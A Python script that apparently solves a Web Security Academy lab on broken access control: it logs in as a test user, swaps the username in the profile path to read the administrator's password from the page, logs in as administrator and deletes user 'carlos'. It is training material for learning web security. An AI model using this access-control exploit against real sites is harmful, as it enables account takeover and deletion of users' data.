from web_security_academy.core.logger import logger
from bs4 import BeautifulSoup


def solve_lab(session, *args):
    # Get user profile path
    csrf = session.get_csrf_token("/login")
    data = {"csrf": csrf, "username": "wiener", "password": "peter"}

    logger.info(
        "Getting user profile path by extracting the redirect link from logging in..."
    )
    resp = session.post_path("/login", data=data, allow_redirects=False)

    if resp.status_code != 302:
        logger.failure("Invalid credentials.")
        return
    else:
        location = resp.headers["Location"]
        logger.success(f"Login successful. Location: {location}")

    # Extract administrator password
    location = location.replace("wiener", "administrator")
    logger.info(f'Visiting "{session.url}{location}"...')
    resp = session.get_path(location)

    if resp.status_code != 200:
        logger.failure("Unable to visit URL.")
        return

    soup = BeautifulSoup(resp.text, "lxml")
    password = soup.select_one('input[name="password"]').get("value")

    if password is None:
        logger.failure("Unable to extract administrator password.")
        return
    else:
        logger.success(f"Administrator password: {password}")

    # Delete user carlos
    session.login("administrator", password)

    logger.info(
        f'Extracting path to delete user carlos by visiting "{session.url}admin"...'
    )
    resp = session.get_path("/admin")

    soup = BeautifulSoup(resp.text, "lxml")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))

    if tag is None:
        logger.failure("Unable to find path.")
        return
    else:
        delete = tag.get("href")
        logger.success(f"Found path: {delete}")

    logger.info("Deleting user carlos...")
    session.get_path(delete)
